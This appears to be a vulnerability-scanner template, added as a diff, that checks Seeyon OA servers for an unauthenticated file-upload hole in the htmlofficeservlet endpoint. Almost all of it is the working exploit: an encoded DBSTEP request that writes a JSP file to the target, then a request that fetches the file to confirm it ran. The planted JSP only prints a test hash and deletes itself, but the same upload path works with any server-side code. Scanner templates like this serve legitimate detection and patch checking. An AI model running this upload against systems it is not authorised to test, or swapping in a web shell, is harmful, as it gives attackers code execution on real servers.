@@ -1,0 +1,72 @@
+id: poc-yaml-seeyon-unauthorized-fileupload
+
+info:
+  name: poc-yaml-seeyon-unauthorized-fileupload
+  author: xray-converter
+  severity: high
+  tags: xray-converted,fileupload,unauth,ct-159051
+  reference:
+    - https://www.secrss.com/articles/11759
+    - https://www.jianshu.com/p/0955bdd7329c
+
+http:
+  - raw:
+      - |
+        GET /seeyon/htmlofficeservlet HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "DBSTEP.*?operate err"
+  - raw:
+      - |
+        POST /seeyon/htmlofficeservlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/html
+
+        DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
+        OPTION=S3WYOSWLBSGr
+        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+        CREATEDATE=wUghPB3szB3Xwg66
+        RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+        originalFileId=wV66
+        originalCreateDate=wUghPB3szB3Xwg66
+        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdwLoGzYOfyUCAwUNCwYMCyUoEwighP4oXy4OJwLQCzAw5nHzs
+        needReadFile=yRWZdAS6
+        originalCreateDate=wLSGP4oEzLKAz4=iz=66
+        <%@ page contentType="text/html;charset=UTF-8" language="java" %>
+        <%@ page import="java.security.MessageDigest" %>
+        <%@ page import="com.sun.org.apache.xerces.internal.impl.dv.util.HexBin" %>
+        <%
+        MessageDigest mdAlgorithm = MessageDigest.getInstance("md5");
+        mdAlgorithm.reset();
+        mdAlgorithm.update("just_a_test".getBytes());
+        byte[] digest = mdAlgorithm.digest();
+        out.println(HexBin.encode(digest).toLowerCase());
+        new java.io.File(application.getRealPath(request.getServletPath())).delete();
+        %>%
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "DBSTEP"
+          - "just_a_test"
+  - raw:
+      - |
+        GET /seeyon/1255dbf9627d1bdf27301822d4a19d7c.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "c6db3524fe71d6c576098805a07e79e4"
